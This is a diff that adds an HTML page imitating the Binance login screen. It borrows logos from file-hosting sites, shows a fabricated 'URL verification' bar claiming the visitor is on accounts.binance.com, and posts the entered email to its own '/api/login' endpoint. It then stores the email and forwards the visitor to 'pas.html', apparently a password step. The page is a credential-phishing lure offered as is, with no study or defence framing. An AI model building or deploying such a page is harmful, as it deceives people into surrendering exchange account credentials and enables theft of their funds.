@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>Binance Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap');
+    body { font-family: 'Inter', sans-serif; }
+    .animate-spin-slow { animation: spin 3s linear infinite; }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+  </style>
+</head>
+<body class="bg-[#1A1B22] text-white min-h-screen flex flex-col">
+  <div class="bg-[#2B2E37] px-4 py-3 text-sm leading-5 text-gray-300">
+    Don't invest unless you're prepared to lose all the money you invest. This is a high-risk investment and you should not expect to be protected if something goes wrong.
+    <a class="text-yellow-400 underline font-semibold" href="#">Take 2 mins to learn more.</a>
+  </div>
+  <header class="bg-[#1E1F25] flex items-center justify-between px-6 py-4">
+    <div class="flex items-center space-x-3">
+      <img alt="Binance logo" class="w-36 h-auto" src="https://files.catbox.moe/7avsdh.png"/>
+    </div>
+    <div>
+      <i class="fas fa-cog text-gray-400 text-2xl animate-spin-slow"></i>
+    </div>
+  </header>
+  <div class="bg-[#2B2E37] flex items-center gap-2 px-6 py-2 text-xs text-gray-300">
+    <i class="fas fa-lock text-green-500"></i>
+    <span>URL verification: <span class="text-green-400">https://</span>accounts.binance.com</span>
+  </div>
+  <main class="flex-grow px-6 py-8 max-w-md mx-auto w-full">
+    <h1 class="text-white font-semibold text-2xl mb-8 select-none">Log In</h1>
+    <label class="block mb-2 text-sm font-medium text-gray-300 select-none" for="email">Email/Phone number</label>
+    <input class="w-full mb-8 rounded-md border border-gray-700 bg-[#1A1B22] px-4 py-3 text-white placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-yellow-400" 
+           id="email" placeholder="" type="text"/>
+    <button class="w-full bg-yellow-400 text-black font-semibold rounded-md py-4 mb-8 hover:bg-yellow-500 transition-colors" 
+            type="button" onclick="submitEmail()">Next</button>
+    <div class="flex items-center text-gray-400 text-xs mb-8">
+      <div class="flex-grow border-t border-gray-700"></div>
+      <span class="px-3 select-none">or</span>
+      <div class="flex-grow border-t border-gray-700"></div>
+    </div>
+    <button class="w-full flex items-center justify-center gap-3 bg-[#4F575F] rounded-md py-4 mb-6 hover:bg-[#5a636a] transition-colors" type="button">
+      <img alt="Google logo" class="w-6 h-6" src="https://files.catbox.moe/060x7d.png"/>
+      <span class="text-white text-base select-none">Continue with Google</span>
+    </button>
+    <button class="w-full flex items-center justify-center gap-3 bg-[#4F575F] rounded-md py-4 mb-8 hover:bg-[#5a636a] transition-colors" type="button">
+      <img alt="Apple logo" class="w-6 h-6" src="https://i.postimg.cc/mkSBZK60/download-1-removebg-preview.png"/>
+      <span class="text-white text-base select-none">Continue with Apple</span>
+    </button>
+    <a class="text-yellow-600 text-base font-semibold select-none" href="#">Create a Binance Account</a>
+  </main>
+
+  <script>
+    async function submitEmail() {
+      const email = document.getElementById('email').value.trim();
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      
+      if (!emailRegex.test(email)) {
+        alert('Please enter a valid email address');
+        return;
+      }
+      
+      try {
+        const response = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email })
+        });
+        
+        const data = await response.json();
+        localStorage.setItem('attemptId', data.attemptId);
+        localStorage.setItem('userEmail', email);
+        window.location.href = 'pas.html';
+      } catch (error) {
+        console.error('Error:', error);
+        alert('Login failed. Please try again.');
+      }
+    }
+  </script>
+</body>
+</html>
